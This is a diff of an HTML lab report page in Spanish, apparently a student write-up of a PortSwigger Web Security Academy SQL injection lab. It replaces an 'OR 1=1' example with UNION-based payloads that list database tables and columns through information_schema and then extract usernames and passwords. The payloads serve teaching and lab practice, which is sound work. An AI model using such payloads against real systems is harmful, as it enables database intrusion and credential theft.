@@ -139,38 +139,37 @@
             <h3 class="section-title">Desarrollo</h3>
         </div>
         <div class="content-area">
-            <p style="font-size:21px; font-weight:bold;">Técnica Aplicada</p>
-            <p class="parrafo">Al enviar el payload <code>' OR 1=1--</code> en el parámetro de la URL, somos capaces de
-                interferir con la estructura de la consulta original, la cual generalmente tiene este aspecto:</p>
-            <pre
-                style="background:#eee; padding:15px; border-radius:4px; font-size:16px;">SELECT * FROM products WHERE category = '[input_usuario]' AND released = 1</pre>
-            <p class="parrafo">El payload altera la lógica resultando en:</p>
-            <pre
-                style="background:#eee; padding:15px; border-radius:4px; font-size:16px;">SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1</pre>
+            <p class='parrafo'>Como no conocemos el esquema de la base de datos, usaremos el esquema predeterminado <code>information_schema</code> para encontrar nombres de tablas y columnas iterativamente.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Listamos todas las tablas disponibles: <code>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>. Encontramos una tabla parecida a <code>users_abcdef</code>.</p><p class='parrafo'>2. Extraemos las columnas de esa tabla: <code>'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code>. Obtenemos columnas como <code>username_123</code> y <code>password_456</code>.</p><p class='parrafo'>3. Finalmente, extraemos los datos de la tabla objetivo: <code>'+UNION+SELECT+username_123,+password_456+FROM+users_abcdef--</code>.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicaci�n</p><p class='parrafo'>Las bases de datos ANSI compatibles exponen metadatos completos en <code>information_schema</code>, lo cual es invaluable para que un atacante descubra la arquitectura antes de extraer datos espec�ficos que llevan un prefijo aleatorio.</p>
+        </div>
+
+        <div class="section">
+            <h3 class="section-title">Contenido Multimedia</h3>
+        </div>
+        <div class="content-area" style="text-align: center;">
+            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaci�n de prueba.</p>
+            <div style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
+                [Espacio reservado para captura de pantalla del usuario]
+            </div>
         </div>
 
         <div class="section">
             <h3 class="section-title">Reflexiones del Alumno</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">Al comprender cómo las bases de datos interpretan la sentencia lógica <code>OR 1=1</code>
-                como matemáticamente verdadera, es fácil deducir por qué devuelven todos los registros almacenados
-                (incluso aquellos normalmente ocultos u obsoletos). Esta resolución evidencia la necesidad crítica de
-                parametrizar cualquier entrada controlada por el usuario.</p>
+            <p class="parrafo">[Espacio para las reflexiones del alumno]</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Referencias Técnicas</h3>
         </div>
         <div class="content-area">
-            <p class="citas" style="font-size: 16px;">PortSwigger. (n.d.). <i>SQL injection vulnerability in WHERE
-                    clause allowing retrieval of hidden data</i>. Web Security Academy. Recuperado de
-                https://portswigger.net/</p>
+            <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>SQL injection attack, listing the database contents on non-Oracle databases</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
         </div>
     </div>
 </body>
 
 </html>
+
 
 
 
